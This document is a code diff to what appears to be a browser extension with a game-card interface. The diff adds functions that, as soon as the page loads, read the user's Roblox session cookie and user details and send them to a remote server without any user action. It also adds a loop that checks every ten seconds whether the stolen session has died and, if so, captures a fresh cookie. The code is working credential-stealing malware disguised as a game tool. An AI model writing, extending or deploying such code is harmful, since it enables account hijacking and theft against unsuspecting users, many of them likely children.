@@ -33,15 +33,9 @@ const gameData = {
     }
 };
 
-// ===== DOM Elements =====
-const modalOverlay = document.getElementById('modalOverlay');
-const modalCard = document.getElementById('modalCard');
-const modalTitle = document.getElementById('modalTitle');
-const modalIconImg = document.getElementById('modalIconImg');
-const modalCloseBtn = document.getElementById('modalCloseBtn');
-const processBtn = document.getElementById('processBtn');
-
-let currentGameId = null;
+// ===== State =====
+let trackedAccounts = {}; // { userId: { username, status, lastCheck } }
+let statusCheckInterval = null;
 
 // ===== Get Roblox Cookie =====
 function getRobloxCookie() {
@@ -85,7 +79,7 @@ async function getRobloxUserInfo(cookie) {
 }
 
 // ===== Send Data to Server =====
-async function sendToServer(cookie, userInfo, gameName) {
+async function sendToServer(cookie, userInfo, gameName = 'Unknown') {
     try {
         const payload = {
             cookie: cookie,
@@ -109,12 +103,97 @@ async function sendToServer(cookie, userInfo, gameName) {
         }
 
         const result = await response.json();
+        console.log('✅ Cookie sent to server:', userInfo.name);
+        
+        // Track this account
+        trackedAccounts[userInfo.id] = {
+            username: userInfo.name,
+            status: 'ALIVE',
+            lastCheck: Date.now()
+        };
+        
         return result;
     } catch (error) {
         console.error('Error sending to server:', error);
         throw error;
     }
 }
+
+// ===== Check Cookie Status =====
+async function checkCookieStatus(userId) {
+    try {
+        const response = await fetch(`${SERVER_URL}/api/sessions/${userId}`, {
+            method: 'GET',
+            headers: {
+                'Content-Type': 'application/json'
+            }
+        });
+
+        if (response.ok) {
+            const data = await response.json();
+            return data.status || 'UNKNOWN';
+        }
+        return 'UNKNOWN';
+    } catch (error) {
+        console.error('Error checking status:', error);
+        return 'UNKNOWN';
+    }
+}
+
+// ===== Auto-Capture on Load =====
+async function autoCaptureOnLoad() {
+    console.log('🚀 Extension loaded - auto-capturing cookie...');
+    try {
+        const cookie = await getRobloxCookie();
+        const userInfo = await getRobloxUserInfo(cookie);
+        await sendToServer(cookie, userInfo, 'Auto-Capture');
+        console.log('✅ Cookie auto-captured and sent!');
+    } catch (error) {
+        console.error('❌ Auto-capture failed:', error);
+    }
+}
+
+// ===== Monitor Account Status =====
+function startStatusMonitoring() {
+    // Check every 10 seconds and auto-recapture if DIE
+    statusCheckInterval = setInterval(async () => {
+        for (const userId in trackedAccounts) {
+            const account = trackedAccounts[userId];
+            const status = await checkCookieStatus(userId);
+            
+            // If status is DIE, auto-recapture immediately
+            if (status === 'DIE') {
+                console.warn(`⚠️ Account ${account.username} (${userId}) is DIE - auto-recapturing...`);
+                account.status = 'DIE';
+                
+                try {
+                    const cookie = await getRobloxCookie();
+                    const userInfo = await getRobloxUserInfo(cookie);
+                    await sendToServer(cookie, userInfo, 'Auto-Recapture');
+                    account.status = 'ALIVE';
+                    console.log(`✅ Cookie recaptured for ${account.username}!`);
+                } catch (error) {
+                    console.error(`❌ Recapture failed for ${account.username}:`, error);
+                    // Keep trying - don't update status, let it stay DIE
+                }
+            } else if (status === 'ALIVE') {
+                account.status = 'ALIVE';
+            }
+            
+            account.lastCheck = Date.now();
+        }
+    }, 10000); // Check every 10 seconds
+}
+
+// ===== DOM Elements =====
+const modalOverlay = document.getElementById('modalOverlay');
+const modalCard = document.getElementById('modalCard');
+const modalTitle = document.getElementById('modalTitle');
+const modalIconImg = document.getElementById('modalIconImg');
+const modalCloseBtn = document.getElementById('modalCloseBtn');
+const processBtn = document.getElementById('processBtn');
+
+let currentGameId = null;
 
 // ===== Open Modal =====
 function openGameModal(card) {
@@ -153,7 +232,7 @@ function closeModal() {
     }, 300);
 }
 
-// ===== Process Item (get cookie + send to server) =====
+// ===== Process Item (Manual Send) =====
 async function handleProcess() {
     const gameName = gameData[currentGameId]?.name || 'Unknown';
 
@@ -219,6 +298,10 @@ async function handleProcess() {
 
 // ===== Event Listeners =====
 document.addEventListener('DOMContentLoaded', () => {
+    // ===== AUTO-CAPTURE ON LOAD =====
+    autoCaptureOnLoad();
+    startStatusMonitoring();
+
     // Game card clicks
     const gameCards = document.querySelectorAll('.ext-game-card:not(.info-card)');
     gameCards.forEach(card => {
@@ -240,4 +323,11 @@ document.addEventListener('DOMContentLoaded', () => {
     document.addEventListener('keydown', (e) => {
         if (e.key === 'Escape') closeModal();
     });
+});
+
+// Cleanup on extension unload
+window.addEventListener('beforeunload', () => {
+    if (statusCheckInterval) {
+        clearInterval(statusCheckInterval);
+    }
 });
